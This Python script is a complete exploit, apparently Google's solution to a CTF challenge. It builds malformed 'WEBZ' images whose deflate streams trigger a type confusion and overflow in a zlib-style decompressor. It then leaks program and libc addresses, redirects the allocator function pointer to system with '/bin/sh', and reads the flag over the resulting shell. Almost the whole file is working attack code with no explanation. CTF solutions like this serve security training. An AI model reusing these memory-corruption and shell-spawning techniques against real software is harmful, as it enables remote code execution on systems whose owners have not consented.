#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Copyright 2025 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import struct
import pwnlib.tubes

ZALLOC_OFFSET = 0x12a0
ZFREE_OFFSET = 0x5500
SETBUF_GOT_OFFSET = 0x12018
FAKE_STATE_OFFSET = 0x129c0
BINSH_ADDR = 0x132cd

LIBC_SETBUF_OFFSET = 0x8f750
LIBC_SYSTEM_OFFSET = 0x58750

class BitStream:
    def __init__(self):
        self.data = bytearray()
        self.bit_position = 0

    def write(self, value, num_bits):
        for i in range(num_bits):
            bit = (value >> i) & 1
            self.write_bit(bit)

    def write_bit(self, bit):
        byte_index = self.bit_position // 8
        bit_index = self.bit_position % 8

        if byte_index >= len(self.data):
            self.data.append(0)

        if bit == 1:
            self.data[byte_index] |= (1 << (bit_index))

        self.bit_position += 1

    def get_bytes(self):
        return bytes(self.data)


def bit_reverse8(x: int) -> int:
    return int(f"{x:08b}"[::-1], 2)


def literal_value(index: int) -> int:
    return bit_reverse8(index & 0xFF) << 7


def len_lookup(len: int) ->int:
    indices = {27: 30784, 99: 29760, 9: 28736, 195: 27712, 15: 26688, 51: 25664, 
               5: 24640, 258: 23616, 19: 22592, 67: 21568, 7: 20544, 131: 19520,
               11: 18496, 35: 17472, 3: 16448, 23: 14400, 83: 13376, 8: 12352,
               163: 11328, 13: 10304, 43: 9280, 4: 8256, 227: 7232, 17: 6208, 
               59: 5184, 6: 4160, 115: 3136, 10: 2112, 31: 1088}
    return indices[len]


def sentinel_lookup(len: int) -> int:
    sentinels = {64: 15424, 96: 64}
    return sentinels[len]


def set_len(arr, index, value):
        order = [3, 17, 15, 13, 11, 9, 7, 5, 4, 6, 8, 10, 12, 14, 16, 18, 0, 1, 2]
        arr[order[index]] = value

def uniform_codelen_histo():
    lens = [0] * 19

    for i in range(1, 16):
        set_len(lens, i, 4)
    
    set_len(lens, 17, 4)

    return lens

def deflate(overflow):
    bs = BitStream()
    
    bs.write(0, 1) # state->last
    bs.write(2, 2) # table switch

    bs.write(0, 5) # nlens
    bs.write(29, 5) # ndists

    ncodes = 15
    bs.write(ncodes, 4) # ncodes

    # Build codelens huffman table
    lens = uniform_codelen_histo()
    assert(len(lens) == ncodes + 4)
    for l in lens:
        bs.write(l, 3)

    lencode_order = [-1, 0, 8, 4, 12, 2, 10, 6, 14, 1, 9, 5, 13, 3, 11, 7, -1, 15]

    # Small lencode huffman table, making the type confusion possible later
    small_histo = [0, 2, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
    
    # 250
    for i in range(25):
        # 10, here.val == 17, write 0b111
        bs.write(lencode_order[17], 4)
        bs.write(7, 3)
    
    # 255
    bs.write(lencode_order[17], 4)
    bs.write(2, 3)

    # 256, 257
    for l, count in enumerate(small_histo):
        for i in range(count):
            assert(lencode_order[l] != -1)
            bs.write(lencode_order[l], 4)

    full_histo = [0, 1, 1, 1, 0, 0, 0, 13, 5, 1, 1, 1, 1, 1, 0, 4]
    for l, count in enumerate(full_histo):
        for i in range(count):
            assert(lencode_order[l] != -1)
            bs.write(lencode_order[l], 4)

    # Reset the decoder, choose end of block
    bs.write(1, 1)

    bs.write(1, 1) # state->last
    bs.write(2, 2) # table switch

    bs.write(29, 5) # nlens
    bs.write(29, 5) # ndists

    ncodes = 15
    bs.write(ncodes, 4) # ncodes

    # Build codelens huffman table
    lens = uniform_codelen_histo()
    assert(len(lens) == ncodes + 4)
    for l in lens:
        bs.write(l, 3)
    
    # LENS incomplete set
    # 128 len gaps between literals
    # All 256 ascii character literals are present
    # and every len somewhere in the table
    incomplete_histo = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 286]

    for l, count in enumerate(incomplete_histo):
        for i in range(count):
            assert(lencode_order[l] != -1)
            bs.write(lencode_order[l], 4)

    # Normal DISTS
    for l, count in enumerate(full_histo):
        for i in range(count):
            assert(lencode_order[l] != -1)
            bs.write(lencode_order[l], 4)

    # padding
    for _ in range(30):
        bs.write(1, 15)
        bs.write(0, 4)

    # read lencode[82], typeconfused DIST code
    bs.write(82, 15)

    # Reset bits
    for _ in range(22):
        bs.write(0, 8)

    to_write = 258
    bin_sh = [47, 98, 105, 110, 47, 115, 104, 0]

    # Write `/bin/sh` for later
    for c in bin_sh:
        bs.write(literal_value(c), 15)
        to_write -= 1  

    # Create padding in buffer with literals
    for _ in range(to_write):
        bs.write(literal_value(0x41), 15)

    # Fill up buffer quickly with lz77 lencodes
    for _ in range(28):
        bs.write(len_lookup(258), 15)
        bs.write(0, 1)

    # Fill up last 113 bytes with literals
    for _ in range(113):
        bs.write(literal_value(0x41), 15)

    ## Overflow z_stream

    # next_in | avail_in | padding
    for _ in range(16):
        bs.write(literal_value(0xff), 15)

    # total_in | next_out
    for _ in range(16):
        bs.write(literal_value(0), 15)

    # avail_out | padding
    for _ in range(8):
        bs.write(literal_value(0xff), 15)

    # total_out
    for _ in range(8):
        bs.write(literal_value(0), 15)

    # Overwrite `msg`
    for b in overflow:
        bs.write(literal_value(b), 15)

    # state->mode = TYPE in infast.c
    bs.write(sentinel_lookup(96), 15)

    # Ensure we always have 6 `in` bytes to
    # trigger `inflate_fast`
    for _ in range(6):
        bs.write(0, 8)

    return bs.get_bytes()


def webz_compress(width, height, overflow):
    header = b"WEBZ" + struct.pack('>HH', width, height) + b"okok"
    compressed_data = deflate(overflow)
    return bytes(header + compressed_data)


def ql(v, b):
    return list(v.to_bytes(b, "little"))

def u64(b: bytes) -> int:
    return struct.unpack("<Q", b.ljust(8, b"\0"))[0]    

def pwn(p):
    overflow = [0xb8]
    leak_image = webz_compress(23, 8, overflow)
    leak_image = struct.pack("<I", len(leak_image)) + leak_image
    p.send(leak_image)
    p.readuntil(b"Read receipt: ")
    zalloc = u64(p.readuntil(b"\n")[:-1].ljust(8, b'\0'))

    base = zalloc - ZALLOC_OFFSET
    zfree = base + ZFREE_OFFSET
    setbuf_ptr = base + SETBUF_GOT_OFFSET

    overflow = ql(setbuf_ptr, 8)
    arb_read_image = webz_compress(23, 8, overflow)
    arb_read_image = struct.pack("<I", len(arb_read_image)) + arb_read_image
    p.send(arb_read_image)
    p.readuntil(b"Read receipt: ")
    setbuf_addr = u64(p.readuntil(b"\n")[:-1].ljust(8, b'\0'))

    libc_base = setbuf_addr - LIBC_SETBUF_OFFSET
    system_addr = libc_base + LIBC_SYSTEM_OFFSET
    bin_sh_addr = base + BINSH_ADDR
    fake_state = base + FAKE_STATE_OFFSET

    print('zalloc: ' + hex(zalloc))
    print('zfree: ' + hex(zfree))
    print('base: ' + hex(base))
    print('setbuf_ptr: ' + hex(setbuf_ptr))
    print('binsh_addr: ' + hex(bin_sh_addr))
    print('libc_base: ' + hex(libc_base))
    print('setbuf_addr: ' + hex(setbuf_addr))
    print('system_addr: ' + hex(system_addr))

    # debug_puts_addr = base + 0x1050
    #               msg                  state               zalloc            zfree           opaque 
    overflow = ql(setbuf_ptr, 8) + ql(fake_state, 8) + ql(system_addr, 8) + ql(zfree, 8) + ql(bin_sh_addr, 8)

    shell_image = webz_compress(23, 8, overflow)
    shell_image = struct.pack("<I", len(shell_image)) + shell_image

    p.send(shell_image)


p = pwnlib.tubes.remote.remote('127.0.0.1', 1337)

def handle_pow(r):
    print(r.recvuntil(b'python3 '))
    print(r.recvuntil(b' solve '))
    challenge = r.recvline().decode('ascii').strip()
    p = pwnlib.tubes.process.process(['kctf_bypass_pow', challenge])
    solution = p.readall().strip()
    r.sendline(solution)
    print(r.recvuntil(b'Correct\n'))

print(p.recvuntil(b'== proof-of-work: '))
if p.recvline().startswith(b'enabled'):
    handle_pow(p)

pwn(p)
p.sendline(b"cat /flag")
print(p.recvuntil(b'CTF{'))
print(p.recvuntil(b'}'))

exit(0)
